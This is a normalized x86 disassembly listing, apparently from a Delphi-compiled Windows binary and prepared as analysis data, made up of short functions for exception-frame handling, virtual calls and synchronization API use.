sub_40fad4
jmp sub_403878
sub_40fadb
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410036
jmp sub_403878
sub_41003d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4100e8
push eax
call sub_40ed68
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_4100fc
push eax
call sub_40ed68
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_410174
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f090
add esp 0x10
sub_41041e
jmp sub_403878
sub_410425
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410468
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40ed68
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_410480
mov edx 0x80020004
call sub_410468
retn
sub_410511
jmp sub_403878
sub_410518
pop esi
pop ebx
pop ebp
retn
sub_41051c
push ebp
mov ebp esp
call sub_4106dc
pop ebp
retn 0x4
sub_4105a8
push ebp
mov ebp esp
call sub_4106dc
pop ebp
retn 0x4
sub_41068b
jmp sub_403878
sub_410692
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403114
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403498
sub_4106b4
xor eax eax
retn
sub_4106b8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4106cc
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4106d4
call sub_40e5b4
retn
sub_4106dc
call sub_40e6a4
retn
sub_4106e4
call sub_40ea7c
retn
sub_4106ec
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410700
call sub_4106dc
retn
sub_410708
push ebp
mov ebp esp
call sub_4106e4
pop ebp
retn 0x8
sub_410720
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4107fc
jmp sub_403878
sub_4108c5
jmp sub_403878
sub_4108cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4108e9
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
sub_4108e2
jmp sub_403878
sub_4108e9
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4108f4
call sub_40ead0
retn
sub_41096b
jmp sub_403878
sub_410972
pop ebp
retn
sub_410a15
jmp sub_403878
sub_410a1c
pop ebp
retn
sub_410b45
jmp sub_403878
sub_410b4c
pop ebp
retn
sub_410b50
sub [ rw-data ] 0x1
retn
sub_410b84
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_410e5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403f4c
pop esi
pop ebx
retn
sub_410ef8
jmp sub_403878
sub_410eff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_410ffa
jmp sub_403878
sub_411001
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411200
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f090
pop esi
pop ebx
retn
sub_411382
jmp sub_403878
sub_411389
pop ebp
retn
sub_41138c
sub [ rw-data ] 0x1
retn
sub_4113b9
jmp sub_403878
sub_4113c0
pop ebp
retn
sub_4113c4
sub [ rw-data ] 0x1
retn
sub_412cc4
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_412de8
mov eax [ eax + 0xc ]
call sub_413fac
retn
sub_4130bf
jmp sub_403878
sub_4130c6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4130cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_414164
test eax eax
setge al
pop esi
pop ebx
retn
sub_4133cf
jmp sub_403878
sub_4133d6
mov esp ebp
pop ebp
retn
sub_4134a4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4134b0
push ebx
mov ebx edx
mov edx ebx
call sub_4132c4
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_413024
sub_41355c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4136b7
jmp sub_403878
sub_41378b
jmp sub_403878
sub_41379c
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_413808
jmp sub_403878
sub_41380f
pop ebx
mov esp ebp
pop ebp
retn
sub_41385a
jmp sub_403878
sub_413861
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4138ed
jmp sub_403878
sub_4138f4
pop ebx
pop ebp
retn
sub_41393a
jmp sub_403878
sub_413941
pop ebx
pop ebp
retn
sub_413986
jmp sub_403878
sub_41398d
pop ebx
pop ebp
retn
sub_4139d7
jmp sub_403878
sub_4139de
pop esi
pop ebx
pop ebp
retn
sub_413a32
jmp sub_403878
sub_413a39
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413b66
jmp sub_403878
sub_413c3c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_4142a4
sub_413d2c
jmp sub_403878
sub_413eb6
jmp sub_403878
sub_413ebd
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413f57
jmp sub_403878
sub_413f5e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f7d
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_413f76
jmp sub_403878
sub_413f7d
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_413fe0
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_414300
xor edx edx
mov eax ebx
call sub_4142c4
pop ebx
retn
sub_414058
mov eax [ ebp + 0x4 ]
retn
sub_41408e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4140dc
jmp sub_403878
sub_4140e3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4140e8
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_414100
xor edx edx
call sub_414108
retn
sub_4141f0
mov edx [ eax + 0x8 ]
dec edx
call sub_414108
retn
sub_414370
retn
sub_41442a
jmp sub_403878
sub_414431
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403498
sub_4144c0
jmp sub_403878
sub_4144c7
pop ebx
pop ecx
pop ebp
retn
sub_4144cc
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_414523
jmp sub_403878
sub_41452a
pop ebx
pop ecx
pop ebp
retn
sub_414530
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41456c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
retn
sub_414584
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_41465f
retn
sub_414660
cmp edx [ eax + 0x4 ]
jae sub_41456c
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_41471c
test edx edx
je r-xdata
xor edx edx
call sub_414730
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_4147e6
jmp sub_403878
sub_4147ed
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414800
xchg edx eax
call sub_414730
retn
sub_414808
retn
sub_4148a1
jmp sub_403878
sub_4148a8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414a65
jmp sub_403878
sub_414a6c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414b00
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x8 ]
xchg edx eax
call sub_414164
retn
sub_414bd5
jmp sub_403878
sub_414bdc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414c20
xor edx edx
call sub_414adc
retn
sub_414d8e
jmp sub_403878
sub_414da8
inc [ eax + 0xc ]
retn
sub_414dac
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_414e16
jmp sub_403878
sub_414e24
dec [ eax + 0xc ]
call sub_414dac
retn
sub_414e30
xor eax eax
retn
sub_414e34
push ebx
mov ebx ecx
mov eax ebx
call sub_403ef8
pop ebx
retn
sub_414e68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414108
pop esi
pop ebx
retn
sub_414f2a
jmp sub_403878
sub_414f31
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415041
jmp sub_403878
sub_41513c
retn
sub_415140
retn
sub_415144
retn
sub_415148
retn
sub_415272
jmp sub_403878
sub_415279
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415296
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
sub_41528f
jmp sub_403878
sub_415296
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415320
jmp sub_403878
sub_415338
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4153f4
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41549d
jmp sub_403878
sub_4154a4
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4154b0
mov eax [ ebp + 0x4 ]
retn
sub_4154e6
pop ecx
pop edx
pop esi
pop ebx
retn
sub_415534
jmp sub_403878
sub_41553b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4155fa
jmp sub_403878
sub_415601
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415623
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f1c
retn
sub_41561c
jmp sub_403878
sub_415623
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41562c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_415634
xor eax eax
retn
sub_41567d
jmp sub_403878
sub_415684
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_415797
jmp sub_403878
sub_41579e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415833
jmp sub_403878
sub_41583a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4158b8
jmp sub_403878
sub_4158bf
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41598f
jmp sub_403878
sub_415996
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415a4c
jmp sub_403878
sub_415a53
pop esi
pop ecx
pop ebp
retn
sub_415ad8
jmp sub_403878
sub_415adf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415afc
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
sub_415af5
jmp sub_403878
sub_415afc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415b88
jmp sub_403878
sub_415ba5
jmp sub_403878
sub_415bac
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415be8
retn
sub_415c6b
jmp sub_403878
sub_415c72
mov eax [ ebp - 0x8 ]
call sub_418988
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415c97
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
sub_415c90
jmp sub_403878
sub_415c97
mov esp ebp
pop ebp
retn
sub_415ce7
jmp sub_403878
sub_415cee
pop esi
pop ecx
pop ebp
retn
sub_415d41
jmp sub_403878
sub_415d48
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415d50
retn
sub_415dcb
jmp sub_403878
sub_415dd2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415e6f
jmp sub_403878
sub_415e76
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415e93
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
sub_415e8c
jmp sub_403878
sub_415e93
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415e98
retn
sub_415f38
jmp sub_403878
sub_415f3f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415fbe
jmp sub_403878
sub_415fc5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415fcc
mov eax edx
mov edx ecx
call sub_407d24
retn
sub_415fd8
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_415ff0
sub_416068
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_4160d8
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_4160f4
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4162e8
mov eax [ eax + 0x18 ]
retn
sub_4162ec
mov eax [ eax + 0x14 ]
retn
sub_416388
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_416594
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_402724
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_4165d0
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_4165e8
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_4165fc
mov edx sub_4165e8
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_416644
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407d24
retn
mov eax edx
mov edx ecx
call sub_407cec
retn
sub_4166e0
retn
sub_4169d8
jmp sub_403878
sub_4169df
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_416a40
jmp sub_403878
sub_416a47
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_416a8c
mov eax [ eax + 0x4 ]
call sub_408360
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_416a9c
mov eax [ eax + 0x4 ]
call sub_40838c
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_416ad8
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_416c81
jmp sub_403878
sub_416ce0
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_416d70
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_416dc0
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_4170db
jmp sub_403878
sub_4170e2
mov esp ebp
pop ebp
retn
sub_41718c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
retn
sub_417214
mov [ eax + 0x18 ] edx
retn
sub_417390
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_410d78
retn
sub_417417
jmp sub_403878
sub_41741e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4174ca
jmp sub_403878
sub_4174d1
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417675
jmp sub_403878
sub_4176c7
jmp sub_403878
sub_4176e6
jmp sub_403878
sub_4176ed
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41770c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_417705
jmp sub_403878
sub_41770c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4177af
jmp sub_403878
sub_417837
jmp sub_403878
sub_417844
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
pop ebx
retn
sub_41785c
mov eax [ rw-data ]
call sub_417844
retn
sub_417894
push ebx
call sub_410bdc
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41785c
sub_417a01
jmp sub_403878
sub_417a08
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403ef8
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_417b28
jmp sub_403878
sub_417b2f
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417c26
jmp sub_403878
sub_417c43
jmp sub_403878
sub_417c4a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417d48
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_416660
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_417e0c
push ebx
mov ebx eax
mov eax ebx
call sub_4197c0
cmp al 0x9
sete al
pop ebx
retn
sub_417e6b
jmp sub_403878
sub_417e72
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_417f18
jmp sub_403878
sub_417f1f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41819e
jmp sub_4035c4
sub_4181ca
jmp sub_4035c4
sub_41826c
jmp sub_4035c4
sub_41830f
jmp sub_4035c4
sub_4184e7
jmp sub_4035c4
sub_418529
jmp sub_403878
sub_418559
jmp sub_403878
sub_418560
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4185cf
jmp sub_403878
sub_4186a6
jmp sub_403878
sub_4186ad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418980
mov dl 0x1
call sub_4178e8
retn
sub_418ab8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_418ac1
jmp sub_403878
j_sub_418ab8
jmp sub_418ab8
sub_418ac8
pop ebx
mov esp ebp
pop ebp
retn
sub_418ad0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4198d0
mov eax [ rw-data ]
call sub_417844
pop ebp
retn
j_sub_4036f0#7
jmp sub_4036f0
j_sub_4036f0#6
jmp sub_4036f0
sub_418c76
add [ eax ] eax
add [ eax ] al
int3
sub_418cbc
jmp sub_403878
sub_418cc3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418da3
jmp sub_403878
sub_418daa
mov esp ebp
pop ebp
retn
sub_418e62
jmp sub_403878
sub_418e69
pop ecx
pop ecx
pop ebp
retn
sub_41916b
jmp sub_403878
sub_419172
pop ebx
mov esp ebp
pop ebp
retn
sub_419417
jmp sub_403878
sub_41941e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403124
retn
sub_419437
jmp sub_403878
sub_41945b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4035c4
sub_419492
jmp sub_4035c4
sub_4194d1
jmp sub_403878
sub_4194d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4194fa
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403f1c
retn
sub_4194f3
jmp sub_403878
sub_4194fa
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419581
jmp sub_4035c4
sub_4195ae
jmp sub_403878
sub_4195b5
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4195c0
push ecx
mov edx esp
mov ecx 0x4
call sub_417d84
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_417844
sub_4196cd
jmp sub_403878
sub_4196d4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4197b3
jmp sub_403878
sub_4197ba
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419810
jmp sub_403878
sub_419817
pop ebx
pop ecx
pop ebp
retn
sub_419a5f
jmp sub_403878
sub_419a66
pop ecx
pop ecx
pop ebp
retn
sub_419aa9
jmp sub_403878
sub_419ab0
pop ebx
pop ecx
pop ebp
retn
sub_419b4c
jmp sub_403878
sub_419b53
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419c01
jmp sub_403878
sub_419c08
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419c14
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_419e6f
jmp sub_403878
sub_419e76
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e9b
mov eax [ ebp - 0x8 ]
call sub_403124
mov eax [ ebp - 0x4 ]
call sub_403124
retn
sub_419e94
jmp sub_403878
sub_419e9b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ec0
lea eax [ ebp - 0x1c ]
call sub_405598
lea eax [ ebp - 0x18 ]
call sub_403ef8
retn
sub_419eb9
jmp sub_403878
sub_419ec0
pop ebx
mov esp ebp
pop ebp
retn
sub_41a0d2
jmp sub_403878
sub_41a0d9
pop ebx
mov esp ebp
pop ebp
retn
sub_41a12c
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_4168c4
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41a144
test dl dl
je r-xdata
mov dl 0x8
call sub_41a2c8
retn
mov dl 0x9
call sub_41a2c8
retn
sub_41a1cc
mov dl 0x1
call sub_41a2c8
retn
sub_41a1d4
xor edx edx
call sub_41a2c8
retn
sub_41a2b9
jmp sub_403878
sub_41a2c0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a2dc
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cc64
sub_41a310
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41a328
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_41a334
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41a328
sub_41a350
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_41a35c
push rw-data
call InterlockedIncrement
retn
sub_41a368
push rw-data
call InterlockedDecrement
retn
sub_41a47e
jmp sub_4035c4
sub_41a4ad
jmp sub_403878
sub_41a4e3
jmp sub_403878
sub_41a4ea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a509
push rw-data
call LeaveCriticalSection
retn
sub_41a502
jmp sub_403878
sub_41a509
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a555
jmp sub_4035c4
sub_41a666
jmp sub_403878
sub_41a66d
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_41a6f4
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_41a9a8
sub_41a76e
jmp sub_403878
sub_41a775
pop ebx
mov esp ebp
pop ebp
retn
sub_41a794
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41a7a8
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_41a794
call sub_41a8fc
sub_41a8a1
jmp sub_403878
sub_41a8a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a8c7
push rw-data
call LeaveCriticalSection
retn
sub_41a8c0
jmp sub_403878
sub_41a8c7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_41a8de
jmp sub_403878
sub_41a924
cmp dl [ eax + 0xe ]
je r-xdata
retn
test dl dl
je r-xdata
call sub_41a9a8
call sub_41a93c
jmp r-xdata
sub_41a989
jmp sub_4035c4
sub_41a9d0
mov [ eax + 0xd ] 0x1
retn
sub_41ab40
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_41ad1c
sub_41aba0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4188d0
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_41abb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4188d0
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41abc8
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41a158
retn
sub_41abd4
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41a158
retn
sub_41ae7c
xor eax eax
retn
sub_41ae80
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41ae88
xor eax eax
retn
sub_41ae8c
retn
sub_41ae90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f4c
pop esi
pop ebx
retn
sub_41aea4
mov eax [ eax + 0x4 ]
retn
sub_41aea8
retn
sub_41aeac
xor eax eax
retn
sub_41aeb0
retn
sub_41aeb4
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_41aec0
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41aecc
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41aed8
retn
sub_41aedc
xchg edx eax
call sub_418574
retn
sub_41aee4
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41af6c
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403320
pop esi
retn
sub_41af80
retn
sub_41b060
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f4c
pop esi
pop ebx
retn
sub_41b0a0
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41b1ec
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_40336c
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41b204
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41b28c
retn
sub_41b2d4
retn
sub_41b30c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41b324
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41b548
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403320
pop esi
pop ebx
retn
sub_41b36c
mov al 0x1
retn
sub_41b370
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41b378
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41b420
xor eax eax
retn
sub_41b424
retn
sub_41b450
retn
sub_41b4e8
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41b4fc
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_413fac
retn
sub_41b643
jmp sub_4035c4
sub_41b648
mov ebx 0x1
call sub_40392c
mov eax ebx
